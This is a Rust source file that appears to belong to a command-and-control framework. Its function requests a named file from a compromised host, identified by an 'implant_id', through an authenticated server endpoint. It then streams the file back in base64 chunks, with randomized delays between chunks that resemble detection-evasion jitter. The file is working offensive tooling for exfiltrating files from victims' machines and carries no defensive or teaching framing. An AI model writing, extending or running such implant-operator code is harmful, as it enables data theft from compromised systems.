use base64::{engine::general_purpose::STANDARD, Engine as _};
use futures::StreamExt;
use rand::Rng;
use reqwest::Response;
use std::{error::Error, fs::File, io::Write, path::Path, time::Duration};
use tokio::time::sleep;
use uuid::Uuid;

use crate::utils::request::send_authenticated_request;

pub async fn receive_file(
    implant_id: Uuid,
    file_path: &str,
    save_path: &Path,
    download_url: &str,
) -> Result<(), Box<dyn Error>> {
    let content_json = &serde_json::json!({
        "uuid": implant_id,
        "file_path": file_path
    });

    let response = send_authenticated_request("post", download_url, content_json).await;

    match response {
        Ok(res) => {
            if res.status().is_success() {
                receive_file_stream(res, save_path)
                    .await
                    .expect("Failed to receive file stream");
            } else {
                return Err(format!("Failed to request file: {}", res.status()).into());
            }
        }
        Err(e) => {
            eprintln!("Error response from server: {}", e);
        }
    }
    println!("Successfully received file: {}", file_path);
    Ok(())
}

async fn receive_file_stream(response: Response, save_path: &Path) -> Result<(), Box<dyn Error>> {
    let mut file = File::create(save_path)?;

    let mut stream = response.bytes_stream();
    let mut buffer = String::new();

    while let Some(chunk_result) = stream.next().await {
        let chunk = chunk_result?;
        let chunk_str = String::from_utf8(chunk.to_vec()).map_err(|e| {
            format!(
                "Failed to convert chunk to string: {}. Chunk data: {:?}",
                e, chunk
            )
        })?;

        buffer.push_str(&chunk_str);

        // Split the buffer by newline to process complete chunks
        while let Some(newline_pos) = buffer.find('\n') {
            let complete_chunk: String = buffer.drain(..newline_pos + 1).collect();
            let complete_chunk_trimmed = complete_chunk.trim(); // Remove the newline

            // Log the received base64 chunk for debugging
            println!(
                "Received base64 chunk (length: {}): {}",
                complete_chunk_trimmed.len(),
                &complete_chunk_trimmed[..100.min(complete_chunk_trimmed.len())]
            );

            // Decode the base64 chunk
            let decoded_chunk = STANDARD.decode(&complete_chunk_trimmed).map_err(|e| {
                format!(
                    "Failed to decode base64 chunk: {}. Chunk data: {}",
                    e, complete_chunk_trimmed
                )
            })?;

            file.write_all(&decoded_chunk)
                .map_err(|e| format!("Failed to write chunk to file: {}", e))?;

            // Simulate a delay between receiving chunks
            let delay = rand::thread_rng().gen_range(505..1250);
            sleep(Duration::from_millis(delay)).await;
        }
    }

    // Process any remaining data in the buffer
    if !buffer.is_empty() {
        let complete_chunk_trimmed = buffer.trim(); // Remove the newline

        // Log the remaining base64 chunk for debugging
        println!(
            "Received remaining base64 chunk (length: {}): {}",
            complete_chunk_trimmed.len(),
            &complete_chunk_trimmed[..100.min(complete_chunk_trimmed.len())]
        );

        // Decode the base64 chunk
        let decoded_chunk = STANDARD.decode(&complete_chunk_trimmed).map_err(|e| {
            format!(
                "Failed to decode remaining base64 chunk: {}. Chunk data: {}",
                e, complete_chunk_trimmed
            )
        })?;

        file.write_all(&decoded_chunk)
            .map_err(|e| format!("Failed to write remaining chunk to file: {}", e))?;
    }
    Ok(())
}
